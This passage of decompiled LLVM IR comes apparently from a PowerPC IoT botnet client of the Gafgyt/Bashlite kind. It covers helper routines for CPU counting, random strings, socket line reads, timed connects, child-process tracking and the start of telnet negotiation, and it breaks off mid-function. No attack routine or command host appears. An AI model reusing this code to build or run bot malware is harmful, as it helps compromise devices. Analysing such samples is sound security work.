  br label %dec_label_pc_10001d3c

dec_label_pc_10001d3c:                            ; preds = %dec_label_pc_10001ccc, %dec_label_pc_10001d2c
  %storemerge = phi i32 [ 1, %dec_label_pc_10001d2c ], [ 0, %dec_label_pc_10001ccc ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_10001bcc, { 1, 0, 3, 2, 4, 7, 5, 6, 8 }
  uselistorder i8* %storemerge2, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_10001d0c, { 3, 0, 1, 2 }
  uselistorder i32 %v3_10001b6c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10001d3c, { 1, 0 }
  uselistorder label %dec_label_pc_10001d0c, { 1, 0 }
  uselistorder label %dec_label_pc_10001ccc, { 1, 0 }
  uselistorder label %dec_label_pc_10001c34, { 1, 0 }
  uselistorder label %dec_label_pc_10001bcc, { 1, 0 }
}

define i32 @getCores() local_unnamed_addr {
entry:
  %stack_var_-4112 = alloca i32, align 4
  store i32 268443020, i32* @lr, align 4
  %v3_10001d88 = call i32 @__libc_open(i32 ptrtoint ([14 x i8]* @global_var_100164fc.25 to i32), i32 0)
  %v2_10001dec = ptrtoint i32* %stack_var_-4112 to i32
  %v1_10001da0 = bitcast i32* %stack_var_-4112 to i8*
  br label %dec_label_pc_10001dec

dec_label_pc_10001d98:                            ; preds = %dec_label_pc_10001dec
  store i32 268443044, i32* @lr, align 4
  %v2_10001da0 = call i32 @uppercase(i8* %v1_10001da0)
  store i32 268443064, i32* @lr, align 4
  %v5_10001db4 = call i32 @strstr(i32 %v2_10001dec, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1001650c.26, i32 0, i32 0), i32 268500992)
  %v4_10001dc0 = icmp eq i32 %v5_10001db4, %v2_10001dec
  br i1 %v4_10001dc0, label %dec_label_pc_10001dc8, label %dec_label_pc_10001dd4

dec_label_pc_10001dc8:                            ; preds = %dec_label_pc_10001d98
  %v1_10001dcc = add i32 %stack_var_-4116.1, 1
  br label %dec_label_pc_10001dd4

dec_label_pc_10001dd4:                            ; preds = %dec_label_pc_10001d98, %dec_label_pc_10001dc8
  %stack_var_-4116.0 = phi i32 [ %v1_10001dcc, %dec_label_pc_10001dc8 ], [ %stack_var_-4116.1, %dec_label_pc_10001d98 ]
  store i32 268443116, i32* @lr, align 4
  %v3_10001de8 = call i32 @__GI_memset(i32 %v2_10001dec, i32 0, i32 4096)
  br label %dec_label_pc_10001dec

dec_label_pc_10001dec:                            ; preds = %entry, %dec_label_pc_10001dd4
  %stack_var_-4116.1 = phi i32 [ 0, %entry ], [ %stack_var_-4116.0, %dec_label_pc_10001dd4 ]
  %v3_10001dfc = call i32 @fdgets(i32 %v2_10001dec, i32 4096, i32 %v3_10001d88)
  %v3_10001e04 = icmp eq i32 %v3_10001dfc, 0
  br i1 %v3_10001e04, label %dec_label_pc_10001e0c, label %dec_label_pc_10001d98

dec_label_pc_10001e0c:                            ; preds = %dec_label_pc_10001dec
  store i32 268443156, i32* @lr, align 4
  %v1_10001e10 = call i32 @__libc_close(i32 %v3_10001d88)
  ret i32 %stack_var_-4116.1

; uselistorder directives
  uselistorder i32 %stack_var_-4116.1, { 0, 2, 1 }
  uselistorder i32 %v2_10001dec, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10001dec, { 1, 0 }
  uselistorder label %dec_label_pc_10001dd4, { 1, 0 }
}

define i32 @makeRandomStr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v0_10001e4c = load i32, i32* %r3.global-to-local, align 4
  %v2_10001ecc4 = icmp sgt i32 %arg2, 0
  br i1 %v2_10001ecc4, label %dec_label_pc_10001e68, label %dec_label_pc_10001ed4

dec_label_pc_10001e68:                            ; preds = %entry, %dec_label_pc_10001e68
  %storemerge37 = phi i32 [ %v1_10001ebc, %dec_label_pc_10001e68 ], [ 0, %entry ]
  %v2_10001e74 = add i32 %storemerge37, %v0_10001e4c
  %v0_10001e78 = call i32 @rand_cmwc()
  store i32 %v0_10001e78, i32* %r3.global-to-local, align 4
  %v1_10001e8c = urem i32 %v0_10001e78, 26
  %fold = add nuw nsw i32 %v1_10001e8c, 65
  %v1_10001eb4 = trunc i32 %fold to i8
  %v3_10001eb4 = inttoptr i32 %v2_10001e74 to i8*
  store i8 %v1_10001eb4, i8* %v3_10001eb4, align 1
  %v1_10001ebc = add nuw nsw i32 %storemerge37, 1
  %v2_10001ecc = icmp slt i32 %v1_10001ebc, %arg2
  br i1 %v2_10001ecc, label %dec_label_pc_10001e68, label %dec_label_pc_10001ec4.dec_label_pc_10001ed4_crit_edge

dec_label_pc_10001ec4.dec_label_pc_10001ed4_crit_edge: ; preds = %dec_label_pc_10001e68
  %v0_10001eec.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10001ed4

dec_label_pc_10001ed4:                            ; preds = %dec_label_pc_10001ec4.dec_label_pc_10001ed4_crit_edge, %entry
  %v0_10001eec = phi i32 [ %v0_10001eec.pre, %dec_label_pc_10001ec4.dec_label_pc_10001ed4_crit_edge ], [ %v0_10001e4c, %entry ]
  ret i32 %v0_10001eec

; uselistorder directives
  uselistorder i32 %v1_10001ebc, { 1, 0 }
  uselistorder i32 %storemerge37, { 1, 0 }
  uselistorder i32 %v0_10001e4c, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_10001e68, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i8, align 1
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_10001f28.29 to i32), i32* @lr, align 4
  %v4_10001f24 = call i32 @__GI_memset(i32 %tmp, i32 0, i32 %arg3)
  store i32 30, i32* %stack_var_-40, align 4
  %v2_10001f38 = ptrtoint i32* %stack_var_-168 to i32
  br label %dec_label_pc_10001f4c

dec_label_pc_10001f4c:                            ; preds = %entry, %dec_label_pc_10001f4c
  %storemerge618 = phi i32 [ 0, %entry ], [ %v1_10001f68, %dec_label_pc_10001f4c ]
  %v1_10001f54 = mul nuw nsw i32 %storemerge618, 4
  %v2_10001f58 = add i32 %v1_10001f54, %v2_10001f38
  %v2_10001f60 = inttoptr i32 %v2_10001f58 to i32*
  store i32 0, i32* %v2_10001f60, align 4
  %v1_10001f68 = add nuw nsw i32 %storemerge618, 1
  %tmp42 = icmp ult i32 %v1_10001f68, 32
  br i1 %tmp42, label %dec_label_pc_10001f4c, label %dec_label_pc_10001f7c

dec_label_pc_10001f7c:                            ; preds = %dec_label_pc_10001f4c
  %v1_10001f80 = udiv i32 %arg1, 32
  %v1_10001f88 = mul nuw nsw i32 %v1_10001f80, 4
  %v2_10001f8c = ptrtoint i32* %stack_var_-200 to i32
  %v2_10001f90 = add nuw nsw i32 %v1_10001f88, 32
  %v1_10001f94 = add i32 %v2_10001f90, %v2_10001f8c
  %v1_10001f98 = inttoptr i32 %v1_10001f94 to i32*
  %v2_10001f98 = load i32, i32* %v1_10001f98, align 4
  %v1_10001fa0 = urem i32 %arg1, 32
  %v3_10001fa8 = shl i32 1, %v1_10001fa0
  %v2_10001fac = or i32 %v2_10001f98, %v3_10001fa8
  store i32 %v2_10001fac, i32* %v1_10001f98, align 4
  %v1_10001fc8 = add i32 %arg1, 1
  %v2_10001fd4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268443632, i32* @lr, align 4
  %v5_10001fec = call i32 @__libc_select(i32 %v1_10001fc8, i32 %v2_10001f38, i32 0, i32 %v2_10001f38, i32 %v2_10001fd4)
  %v2_10001ffc = icmp sgt i32 %v5_10001fec, 0
  br i1 %v2_10001ffc, label %dec_label_pc_100021a8.preheader, label %dec_label_pc_1000210c.preheader

dec_label_pc_1000210c.preheader:                  ; preds = %dec_label_pc_10001f7c
  %tmp43 = icmp slt i32 %tmp25, 10
  br i1 %tmp43, label %dec_label_pc_10002008, label %dec_label_pc_100021a8.preheader

dec_label_pc_10002008:                            ; preds = %dec_label_pc_1000210c.preheader, %dec_label_pc_10002100
  %stack_var_-176.017 = phi i32 [ %v1_10002104, %dec_label_pc_10002100 ], [ %tmp25, %dec_label_pc_1000210c.preheader ]
  %v3_1000200c = load i32, i32* @global_var_1002c8e0.30, align 4
  store i32 ptrtoint (i32* @global_var_10002024.32 to i32), i32* @lr, align 4
  %v4_10002020 = call i32 @HackerPrint(i32 %v3_1000200c, i32 ptrtoint ([5 x i8]* @global_var_10016518.31 to i32), i32 268500992)
  store i32 30, i32* %stack_var_-40, align 4
  store i32 %v2_10001f38, i32* %stack_var_-200, align 4
  store i32 0, i32* %stack_var_-168, align 4
  br label %dec_label_pc_10002048.dec_label_pc_10002048_crit_edge

dec_label_pc_10002048.dec_label_pc_10002048_crit_edge: ; preds = %dec_label_pc_10002048.dec_label_pc_10002048_crit_edge.dec_label_pc_10002048.dec_label_pc_10002048_crit_edge_crit_edge, %dec_label_pc_10002008
  %v3_1000204c.pre = phi i32 [ %v2_10001f38, %dec_label_pc_10002008 ], [ %v3_1000204c.pre.pre, %dec_label_pc_10002048.dec_label_pc_10002048_crit_edge.dec_label_pc_10002048.dec_label_pc_10002048_crit_edge_crit_edge ]
  %v1_1000206449 = phi i32 [ 1, %dec_label_pc_10002008 ], [ %v1_10002064, %dec_label_pc_10002048.dec_label_pc_10002048_crit_edge.dec_label_pc_10002048.dec_label_pc_10002048_crit_edge_crit_edge ]
  %v1_10002050 = mul nuw nsw i32 %v1_1000206449, 4
  %v2_10002054 = add i32 %v1_10002050, %v3_1000204c.pre
  %v2_1000205c = inttoptr i32 %v2_10002054 to i32*
  store i32 0, i32* %v2_1000205c, align 4
  %v1_10002064 = add nuw nsw i32 %v1_1000206449, 1
  %tmp44 = icmp ult i32 %v1_10002064, 32
  br i1 %tmp44, label %dec_label_pc_10002048.dec_label_pc_10002048_crit_edge.dec_label_pc_10002048.dec_label_pc_10002048_crit_edge_crit_edge, label %dec_label_pc_10002078

dec_label_pc_10002048.dec_label_pc_10002048_crit_edge.dec_label_pc_10002048.dec_label_pc_10002048_crit_edge_crit_edge: ; preds = %dec_label_pc_10002048.dec_label_pc_10002048_crit_edge
  %v3_1000204c.pre.pre = load i32, i32* %stack_var_-200, align 4
  br label %dec_label_pc_10002048.dec_label_pc_10002048_crit_edge

dec_label_pc_10002078:                            ; preds = %dec_label_pc_10002048.dec_label_pc_10002048_crit_edge
  %v2_10002094 = load i32, i32* %v1_10001f98, align 4
  %v2_100020a8 = or i32 %v2_10002094, %v3_10001fa8
  store i32 %v2_100020a8, i32* %v1_10001f98, align 4
  store i32 268443884, i32* @lr, align 4
  %v5_100020e8 = call i32 @__libc_select(i32 %v1_10001fc8, i32 %v2_10001f38, i32 0, i32 %v2_10001f38, i32 %v2_10001fd4)
  %v2_100020f8 = icmp sgt i32 %v5_100020e8, 0
  br i1 %v2_100020f8, label %dec_label_pc_100021a8.preheader, label %dec_label_pc_10002100

dec_label_pc_10002100:                            ; preds = %dec_label_pc_10002078
  %v1_10002104 = add nsw i32 %stack_var_-176.017, 1
  %tmp45 = icmp slt i32 %v1_10002104, 10
  br i1 %tmp45, label %dec_label_pc_10002008, label %dec_label_pc_100021a8.preheader

dec_label_pc_100021a8.preheader:                  ; preds = %dec_label_pc_10002100, %dec_label_pc_10002078, %dec_label_pc_1000210c.preheader, %dec_label_pc_10001f7c
  %v2_10002134 = ptrtoint i8* %stack_var_-32 to i32
  br label %dec_label_pc_100021a8

dec_label_pc_1000212c:                            ; preds = %dec_label_pc_100021a8
  %v3_10002130 = load i32, i32* @global_var_1002c8e0.30, align 4
  store i32 268443980, i32* @lr, align 4
  %v4_10002148 = call i32 @__libc_recv(i32 %v3_10002130, i32 %v2_10002134, i32 1, i32 0)
  %v3_10002150 = icmp eq i32 %v4_10002148, 1
  br i1 %v3_10002150, label %dec_label_pc_10002170, label %dec_label_pc_10002158

dec_label_pc_10002158:                            ; preds = %dec_label_pc_1000212c
  store i8 0, i8* %stack_var_-180.0, align 1
  br label %dec_label_pc_100021e4

dec_label_pc_10002170:                            ; preds = %dec_label_pc_1000212c
  %v3_10002170 = load i8, i8* %stack_var_-32, align 1
  %v4_10002178 = ptrtoint i8* %stack_var_-180.0 to i32
  store i8 %v3_10002170, i8* %stack_var_-180.0, align 1
  %v1_10002184 = add i32 %v4_10002178, 1
  %v5_10002188 = inttoptr i32 %v1_10002184 to i8*
  %v3_1000218c = load i8, i8* %stack_var_-32, align 1
  %v3_10002194 = icmp eq i8 %v3_1000218c, 10
  br i1 %v3_10002194, label %dec_label_pc_100021d0, label %dec_label_pc_1000219c

dec_label_pc_1000219c:                            ; preds = %dec_label_pc_10002170
  %v1_100021a0 = add i32 %stack_var_-184.0, 1
  br label %dec_label_pc_100021a8

dec_label_pc_100021a8:                            ; preds = %dec_label_pc_100021a8.preheader, %dec_label_pc_1000219c
  %stack_var_-180.0 = phi i8* [ %v5_10002188, %dec_label_pc_1000219c ], [ %arg2, %dec_label_pc_100021a8.preheader ]
  %stack_var_-184.0 = phi i32 [ %v1_100021a0, %dec_label_pc_1000219c ], [ 0, %dec_label_pc_100021a8.preheader ]
  %v0_100021b0 = call i32 @__asm_mfcr()
  %v1_100021b4 = call i32 @__asm_rlwinm(i32 %v0_100021b0, i32 30, i32 31, i32 31)
  %v1_100021b8 = urem i32 %v1_100021b4, 256
  %v3_100021c8 = icmp eq i32 %v1_100021b8, 0
  br i1 %v3_100021c8, label %dec_label_pc_100021d0, label %dec_label_pc_1000212c

dec_label_pc_100021d0:                            ; preds = %dec_label_pc_100021a8, %dec_label_pc_10002170
  %stack_var_-180.1 = phi i8* [ %stack_var_-180.0, %dec_label_pc_100021a8 ], [ %v5_10002188, %dec_label_pc_10002170 ]
  store i8 0, i8* %stack_var_-180.1, align 1
  br label %dec_label_pc_100021e4

dec_label_pc_100021e4:                            ; preds = %dec_label_pc_10002158, %dec_label_pc_100021d0
  %storemerge = phi i32 [ -1, %dec_label_pc_10002158 ], [ %stack_var_-184.0, %dec_label_pc_100021d0 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-180.0, { 3, 0, 1, 2 }
  uselistorder i8* %v5_10002188, { 1, 0 }
  uselistorder i32 %v1_10002104, { 1, 0 }
  uselistorder i32 %v1_10002064, { 1, 0 }
  uselistorder i32 %v2_10001fd4, { 1, 0 }
  uselistorder i32* %v1_10001f98, { 1, 2, 0, 3 }
  uselistorder i32 %storemerge618, { 1, 0 }
  uselistorder i32 %v2_10001f38, { 5, 4, 0, 6, 3, 2, 1 }
  uselistorder i32* %stack_var_-40, { 0, 2, 1 }
  uselistorder i8* %stack_var_-32, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100021e4, { 1, 0 }
  uselistorder label %dec_label_pc_100021a8, { 1, 0 }
  uselistorder label %dec_label_pc_10002008, { 1, 0 }
  uselistorder label %dec_label_pc_10001f4c, { 1, 0 }
}

define i32 @hostname_to_ip(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 268444200, i32* @lr, align 4
  %v1_10002224 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v3_10002234 = icmp eq i32 %v1_10002224, 0
  br i1 %v3_10002234, label %dec_label_pc_1000223c, label %dec_label_pc_10002254

dec_label_pc_1000223c:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_10002248.34 to i32), i32* @lr, align 4
  %v4_10002244 = call i32 @__GI_herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_10016520.33, i32 0, i32 0), i32 268500992)
  br label %dec_label_pc_100022d8

dec_label_pc_10002254:                            ; preds = %entry
  %v1_10002258 = add i32 %v1_10002224, 16
  %v2_10002258 = inttoptr i32 %v1_10002258 to i32*
  %v3_10002258 = load i32, i32* %v2_10002258, align 4
  %v1_1000227c = inttoptr i32 %v3_10002258 to i32*
  %v2_1000227c = load i32, i32* %v1_1000227c, align 4
  %v3_10002280 = icmp eq i32 %v2_1000227c, 0
  br i1 %v3_10002280, label %dec_label_pc_100022d0, label %dec_label_pc_10002288

dec_label_pc_10002288:                            ; preds = %dec_label_pc_10002254
  %v2_1000229c = load i32, i32* %v1_1000227c, align 4
  %v1_100022a0 = inttoptr i32 %v2_1000229c to i32*
  %v2_100022a0 = load i32, i32* %v1_100022a0, align 4
  store i32 %v2_100022a0, i32* %stack_var_-16, align 4
  store i32 268444340, i32* @lr, align 4
  %v3_100022b0 = call i32 @__GI_inet_ntoa(i32* nonnull %stack_var_-16, i32 %v2_1000229c)
  %v2_100022c0 = inttoptr i32 %v3_100022b0 to i8*
  %v3_100022c0 = call i32 @strcpy(i32 %arg2, i8* %v2_100022c0)
  br label %dec_label_pc_100022d8

dec_label_pc_100022d0:                            ; preds = %dec_label_pc_10002254
  br label %dec_label_pc_100022d8

dec_label_pc_100022d8:                            ; preds = %dec_label_pc_10002288, %dec_label_pc_1000223c, %dec_label_pc_100022d0
  %stack_var_-12.0 = phi i32 [ 1, %dec_label_pc_1000223c ], [ 1, %dec_label_pc_100022d0 ], [ 0, %dec_label_pc_10002288 ]
  ret i32 %stack_var_-12.0

; uselistorder directives
  uselistorder label %dec_label_pc_100022d8, { 2, 0, 1 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  store i32 268444464, i32* @lr, align 4
  %v2_1000232c = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  store i32 ptrtoint (i32* @global_var_10002358.36 to i32), i32* @lr, align 4
  %v2_10002354 = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  store i32 2, i32* %stack_var_-200, align 4
  %v1_10002364 = urem i32 %arg3, 65536
  store i32 %v1_10002364, i32* @r3, align 4
  %v1_1000236c = call i32 @htons(i32 %v1_10002364)
  %v2_1000237c = ptrtoint i32* %stack_var_-200 to i32
  %v4_1000238c = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-196, i32 %v2_1000237c)
  %v3_10002394 = icmp eq i32 %v4_1000238c, 0
  br i1 %v3_10002394, label %dec_label_pc_100023a8, label %dec_label_pc_1000239c

dec_label_pc_1000239c:                            ; preds = %entry
  br label %dec_label_pc_10002568

dec_label_pc_100023a8:                            ; preds = %entry
  store i32 268444628, i32* @lr, align 4
  %v3_100023d0 = call i32 @__libc_connect(i32 %arg1, i32 %v2_1000237c, i32 16)
  %tmp26 = icmp sgt i32 %v3_100023d0, -1
  br i1 %tmp26, label %dec_label_pc_10002524, label %dec_label_pc_100023e8

dec_label_pc_100023e8:                            ; preds = %dec_label_pc_100023a8
  %v0_100023e8 = call i32 @__errno_location()
  %v1_100023f0 = inttoptr i32 %v0_100023e8 to i32*
  %v2_100023f0 = load i32, i32* %v1_100023f0, align 4
  %v3_100023f4 = icmp eq i32 %v2_100023f0, 115
  br i1 %v3_100023f4, label %dec_label_pc_100023fc, label %dec_label_pc_10002518

dec_label_pc_100023fc:                            ; preds = %dec_label_pc_100023e8
  store i32 %arg4, i32* %stack_var_-56, align 4
  %v2_1000240c = ptrtoint i32* %stack_var_-184 to i32
  store i32 %v2_1000240c, i32* %stack_var_-216, align 4
  store i32 0, i32* %stack_var_-184, align 4
  br label %dec_label_pc_10002420.dec_label_pc_10002420_crit_edge

dec_label_pc_10002420.dec_label_pc_10002420_crit_edge: ; preds = %dec_label_pc_10002420.dec_label_pc_10002420_crit_edge.dec_label_pc_10002420.dec_label_pc_10002420_crit_edge_crit_edge, %dec_label_pc_100023fc
  %v3_10002424.pre = phi i32 [ %v2_1000240c, %dec_label_pc_100023fc ], [ %v3_10002424.pre.pre, %dec_label_pc_10002420.dec_label_pc_10002420_crit_edge.dec_label_pc_10002420.dec_label_pc_10002420_crit_edge_crit_edge ]
  %v1_1000243c30 = phi i32 [ 1, %dec_label_pc_100023fc ], [ %v1_1000243c, %dec_label_pc_10002420.dec_label_pc_10002420_crit_edge.dec_label_pc_10002420.dec_label_pc_10002420_crit_edge_crit_edge ]
  %v1_10002428 = mul nuw nsw i32 %v1_1000243c30, 4
  %v2_1000242c = add i32 %v1_10002428, %v3_10002424.pre
  %v2_10002434 = inttoptr i32 %v2_1000242c to i32*
  store i32 0, i32* %v2_10002434, align 4
  %v1_1000243c = add nuw nsw i32 %v1_1000243c30, 1
  %tmp27 = icmp ult i32 %v1_1000243c, 32
  br i1 %tmp27, label %dec_label_pc_10002420.dec_label_pc_10002420_crit_edge.dec_label_pc_10002420.dec_label_pc_10002420_crit_edge_crit_edge, label %dec_label_pc_10002450

dec_label_pc_10002420.dec_label_pc_10002420_crit_edge.dec_label_pc_10002420.dec_label_pc_10002420_crit_edge_crit_edge: ; preds = %dec_label_pc_10002420.dec_label_pc_10002420_crit_edge
  %v3_10002424.pre.pre = load i32, i32* %stack_var_-216, align 4
  br label %dec_label_pc_10002420.dec_label_pc_10002420_crit_edge

dec_label_pc_10002450:                            ; preds = %dec_label_pc_10002420.dec_label_pc_10002420_crit_edge
  %v1_10002454 = udiv i32 %arg1, 32
  %v1_1000245c = mul nuw nsw i32 %v1_10002454, 4
  %v2_10002460 = ptrtoint i32* %stack_var_-216 to i32
  %v2_10002464 = add nuw nsw i32 %v1_1000245c, 32
  %v1_10002468 = add i32 %v2_10002464, %v2_10002460
  %v1_1000246c = inttoptr i32 %v1_10002468 to i32*
  %v2_1000246c = load i32, i32* %v1_1000246c, align 4
  %v1_10002474 = urem i32 %arg1, 32
  %v3_1000247c = shl i32 1, %v1_10002474
  %v2_10002480 = or i32 %v2_1000246c, %v3_1000247c
  store i32 %v2_10002480, i32* %v1_1000246c, align 4
  %v1_1000249c = add i32 %arg1, 1
  %v2_100024a4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268444864, i32* @lr, align 4
  %v5_100024bc = call i32 @__libc_select(i32 %v1_1000249c, i32 0, i32 %v2_1000240c, i32 0, i32 %v2_100024a4)
  %tmp28 = icmp slt i32 %v5_100024bc, 1
  br i1 %tmp28, label %dec_label_pc_1000250c, label %dec_label_pc_100024cc

dec_label_pc_100024cc:                            ; preds = %dec_label_pc_10002450
  store i32 4, i32* %stack_var_-48, align 4
  %v2_100024d4 = ptrtoint i32* %stack_var_-44 to i32
  %v2_100024d8 = ptrtoint i32* %stack_var_-48 to i32
  store i32 268444916, i32* @lr, align 4
  %v5_100024f0 = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_100024d4, i32 %v2_100024d8)
  %v3_100024f4 = load i32, i32* %stack_var_-44, align 4
  %v3_100024f8 = icmp eq i32 %v3_100024f4, 0
  br i1 %v3_100024f8, label %dec_label_pc_10002524, label %dec_label_pc_10002500

dec_label_pc_10002500:                            ; preds = %dec_label_pc_100024cc
  br label %dec_label_pc_10002568

dec_label_pc_1000250c:                            ; preds = %dec_label_pc_10002450
  br label %dec_label_pc_10002568

dec_label_pc_10002518:                            ; preds = %dec_label_pc_100023e8
  br label %dec_label_pc_10002568

dec_label_pc_10002524:                            ; preds = %dec_label_pc_100024cc, %dec_label_pc_100023a8
  store i32 268444984, i32* @lr, align 4
  %v2_10002534 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_10002544 = call i32 @__asm_rlwinm(i32 %v2_10002534, i32 0, i32 21, i32 19)
  store i32 ptrtoint (i32* @global_var_10002560.37 to i32), i32* @lr, align 4
  %v2_1000255c = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  br label %dec_label_pc_10002568

dec_label_pc_10002568:                            ; preds = %dec_label_pc_10002518, %dec_label_pc_1000250c, %dec_label_pc_10002500, %dec_label_pc_1000239c, %dec_label_pc_10002524
  %stack_var_-24.0 = phi i32 [ 1, %dec_label_pc_10002524 ], [ 0, %dec_label_pc_1000250c ], [ 0, %dec_label_pc_10002500 ], [ 0, %dec_label_pc_10002518 ], [ 0, %dec_label_pc_1000239c ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %v1_1000243c, { 1, 0 }
  uselistorder i32 %v2_1000240c, { 1, 0, 2 }
  uselistorder i32 %v2_1000237c, { 1, 0 }
  uselistorder i32 %v1_10002364, { 1, 0 }
  uselistorder i32* %stack_var_-200, { 1, 0 }
  uselistorder i32* %stack_var_-216, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32 %arg1, { 4, 5, 2, 3, 1, 0, 6, 7, 8 }
  uselistorder label %dec_label_pc_10002568, { 4, 0, 1, 2, 3 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  store i32 268445088, i32* @lr, align 4
  %v0_1000259c = call i32 @__libc_fork()
  %v3_100025ac = icmp eq i32 %v0_1000259c, 0
  br i1 %v3_100025ac, label %dec_label_pc_10002730, label %dec_label_pc_100025c0

dec_label_pc_100025c0:                            ; preds = %entry
  %v3_100025c8 = load i32, i32* @global_var_1002c8ec.39, align 4
  %v2_100025cc = load i32, i32* @global_var_1002c8e8.38, align 4
  %v1_100025d0 = add i32 %v3_100025c8, 1
  %v2_100025d0 = icmp eq i32 %v3_100025c8, -1
  %v2_100025d4 = zext i1 %v2_100025d0 to i32
  %v3_100025d4 = add i32 %v2_100025d4, %v2_100025cc
  store i32 %v3_100025d4, i32* @global_var_1002c8e8.38, align 4
  store i32 %v1_100025d0, i32* @global_var_1002c8ec.39, align 4
  %v1_10002604 = mul i32 %v1_100025d0, 4
  %v1_1000260c = add i32 %v1_10002604, 4
  store i32 268445208, i32* @lr, align 4
  %v1_10002614 = call i32 @malloc(i32 %v1_1000260c)
  br label %dec_label_pc_1000266c

dec_label_pc_1000262c:                            ; preds = %dec_label_pc_1000266c, %dec_label_pc_100026bc
  %v1_10002630 = mul i32 %storemerge2, 4
  %v2_1000263c = add i32 %v1_10002630, %v1_10002614
  %v3_10002650 = load i32, i32* @global_var_1002c914.40, align 4
  %v2_10002654 = add i32 %v3_10002650, %v1_10002630
  %v1_10002658 = inttoptr i32 %v2_10002654 to i32*
  %v2_10002658 = load i32, i32* %v1_10002658, align 4
  %v2_1000265c = inttoptr i32 %v2_1000263c to i32*
  store i32 %v2_10002658, i32* %v2_1000265c, align 4
  %v1_10002664 = add i32 %storemerge2, 1
  br label %dec_label_pc_1000266c

dec_label_pc_1000266c:                            ; preds = %dec_label_pc_100025c0, %dec_label_pc_1000262c
  %storemerge2 = phi i32 [ 0, %dec_label_pc_100025c0 ], [ %v1_10002664, %dec_label_pc_1000262c ]
  %v3_10002694 = load i32, i32* @global_var_1002c8ec.39, align 4
  %v2_10002698 = load i32, i32* @global_var_1002c8e8.38, align 4
  %v2_1000269c = icmp ne i32 %v3_10002694, 0
  %v3_100026a0 = add i32 %v2_10002698, -1
  %v4_100026a0 = sext i1 %v2_1000269c to i32
  %v3_100026b4 = icmp eq i32 %v3_100026a0, %v4_100026a0
  br i1 %v3_100026b4, label %dec_label_pc_100026bc, label %dec_label_pc_1000262c

dec_label_pc_100026bc:                            ; preds = %dec_label_pc_1000266c
  %v1_1000269c = add i32 %v3_10002694, -1
  %v3_100026d4 = icmp ugt i32 %v1_1000269c, %storemerge2
  br i1 %v3_100026d4, label %dec_label_pc_1000262c, label %dec_label_pc_100026dc

dec_label_pc_100026dc:                            ; preds = %dec_label_pc_100026bc
  %v1_100026f0 = mul i32 %v3_10002694, 4
  %v2_100026fc = add i32 %v1_10002614, -4
  %v1_10002700 = add i32 %v2_100026fc, %v1_100026f0
  %v2_10002708 = inttoptr i32 %v1_10002700 to i32*
  store i32 %v0_1000259c, i32* %v2_10002708, align 4
  %v3_10002710 = load i32, i32* @global_var_1002c914.40, align 4
  store i32 268445468, i32* @lr, align 4
  %v1_10002718 = call i32 @free(i32 %v3_10002710)
  store i32 %v1_10002614, i32* @global_var_1002c914.40, align 4
  br label %dec_label_pc_10002730

dec_label_pc_10002730:                            ; preds = %entry, %dec_label_pc_100026dc
  ret i32 %v0_1000259c

; uselistorder directives
  uselistorder i32 %storemerge2, { 1, 0, 2 }
  uselistorder i32 %v1_10002630, { 1, 0 }
  uselistorder i32 %v1_10002614, { 1, 2, 0 }
  uselistorder i32 %v3_100025c8, { 1, 0 }
  uselistorder label %dec_label_pc_10002730, { 1, 0 }
  uselistorder label %dec_label_pc_1000266c, { 1, 0 }
  uselistorder label %dec_label_pc_1000262c, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i8, align 1
  %v1_10002774 = add i32 %arg2, 1
  %v1_10002778 = inttoptr i32 %v1_10002774 to i8*
  %v2_10002778 = load i8, i8* %v1_10002778, align 1
  %v1_10002788 = icmp ult i8 %v2_10002778, -5
  br i1 %v1_10002788, label %dec_label_pc_100028e0, label %dec_label_pc_10002790

dec_label_pc_10002790:                            ; preds = %entry
  %v2_10002794 = icmp eq i8 %v2_10002778, -1
  br i1 %v2_10002794, label %dec_label_pc_1000279c, label %dec_label_pc_100027b8

